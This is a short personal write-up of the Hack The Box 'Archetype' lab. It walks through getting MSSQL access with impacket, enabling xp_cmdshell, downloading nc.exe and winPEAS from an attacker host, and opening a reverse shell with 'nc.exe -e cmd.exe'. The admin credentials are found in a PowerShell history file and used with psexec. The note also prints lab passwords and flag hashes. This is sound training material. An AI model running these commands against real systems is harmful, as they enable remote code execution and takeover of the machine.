#hackthebox #lab #Windows #SMB #impacket 



ARCHETYPE:M3g4c0rp123


We find config with database login cred, and we can use impacket tool to access the database:
```shell
impacket-mssqlclient sql_svc@10.129.95.187 -windows-auth 
```
- (The commands my very depending on if we use the apt version or newest sourcecode)

Once we are inside the mssql db we can enable xp_cmdshell and try to look for "stuff".

more on mssql: https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet 

```
xp_cmdshell powershell -c "Invoke-WebRequest -Uri http://10.10.14.18:42069/winPEAS.exe -OutFile C:\Windows\Temp\winPEAS.exe"
```

- This did not work, most likely because our sql_svg user do not have permission do upload / download file to \TEMP folder.
- We can try to upload to another folder (tested this, and it works in our home folder) - but instead, we use the change to improve our shell first.

Instead we can do:
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.18:80/nc.exe -outfile nc.exe"
```

- Improved shell for windows: https://github.com/int0x33/nc.exe


Then we setup a nc listener, and run the nc.exe script on the target:
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.18 443"
```

This gives us a more stable shell.

Now we can try uploading our winPEAS script:
```
wget http://10.10.14.18/winPEASx64.exe -outfile winPEASx64.exe
```
- Which works! 

Now we run winPEAS, it gives lots of output, but we get a hint that we are looking for a history file.
```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
 = .bash_history for windows.

This gives us the admin creds:
/user:administrator MEGACORP_4dm1n!!

Which are can use to connect to the server:
```
impacket-psexec WORKGROUP/ADMINISTRATOR@10.129.95.187
```

user: 3e7b102e78218e935bf3f4951fec21a3 
b91ccec3305e98240082d4474b848528